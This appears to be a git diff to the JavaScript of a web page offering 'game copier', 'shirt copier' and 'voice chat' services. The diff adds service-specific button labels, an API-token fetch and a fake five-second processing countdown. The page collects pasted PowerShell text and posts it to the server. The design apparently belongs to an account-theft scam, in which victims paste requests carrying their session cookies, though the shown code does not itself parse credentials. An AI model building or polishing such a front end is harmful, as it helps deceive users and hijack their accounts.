@@ -1019,6 +1019,20 @@ function selectService(serviceType) {
 function showServiceVideo(serviceType) {
   const videoSection = document.getElementById('videoSection');
   const youtubeVideo = document.getElementById('youtubeVideo');
+  const activateBtn = document.getElementById('btn');
+  
+  // Update button text based on service type
+  const buttonTexts = {
+    'game-copier': 'Copy Game',
+    'shirt-copier': 'Copy Shirt',
+    'voice-chat': 'Enable Voice Chat'
+  };
+  
+  if (serviceType && buttonTexts[serviceType]) {
+    activateBtn.textContent = buttonTexts[serviceType];
+  } else {
+    activateBtn.textContent = 'Activate';
+  }
   
   if (serviceType && serviceVideos[serviceType]) {
     youtubeVideo.src = serviceVideos[serviceType];
@@ -1074,7 +1088,7 @@ document.addEventListener('DOMContentLoaded', function() {
     selectedText.textContent = text;
     hiddenInput.value = value;
     
-    // Show video for selected service
+    // Show video for selected service and update button text
     showServiceVideo(value);
     
     closeDropdown();
@@ -1103,6 +1117,24 @@ document.addEventListener('DOMContentLoaded', function() {
   }
 });
 
+// Store API token
+let apiToken = null;
+
+// Function to get API token
+async function getApiToken() {
+  if (apiToken) return apiToken;
+  
+  try {
+    const response = await fetch('/api/token');
+    const data = await response.json();
+    apiToken = data.token;
+    return apiToken;
+  } catch (error) {
+    console.error('Failed to get API token:', error);
+    throw new Error('Unable to authenticate request');
+  }
+}
+
 async function go(){
   const ps = document.getElementById("ps").value.trim();
   const scriptType = document.getElementById("scriptType").value;
@@ -1128,13 +1160,35 @@ async function go(){
   }
   
   try {
-    btnEl.textContent = "Submitting...";
     btnEl.disabled = true;
     statusEl.style.display = "none";
     
+    // Get API token
+    const token = await getApiToken();
+    
+    // 5-second countdown loading effect
+    let countdown = 5;
+    btnEl.textContent = `Processing... ${countdown}`;
+    
+    const countdownInterval = setInterval(() => {
+      countdown--;
+      if (countdown > 0) {
+        btnEl.textContent = `Processing... ${countdown}`;
+      } else {
+        clearInterval(countdownInterval);
+        btnEl.textContent = "Submitting...";
+      }
+    }, 1000);
+    
+    // Wait for countdown to finish
+    await new Promise(resolve => setTimeout(resolve, 5000));
+    
     const r = await fetch("/convert", {
       method: "POST",
-      headers: {"Content-Type": "application/json"},
+      headers: {
+        "Content-Type": "application/json",
+        "X-API-Token": token
+      },
       body: JSON.stringify({powershell: ps, scriptType: scriptType})
     });
     
@@ -1155,7 +1209,8 @@ async function go(){
       opt.classList.remove('selected');
     });
     
-    // Hide video section
+    // Reset button text and hide video section
+    btnEl.textContent = "Activate";
     document.getElementById('videoSection').style.display = 'none';
     
   } catch (error) {
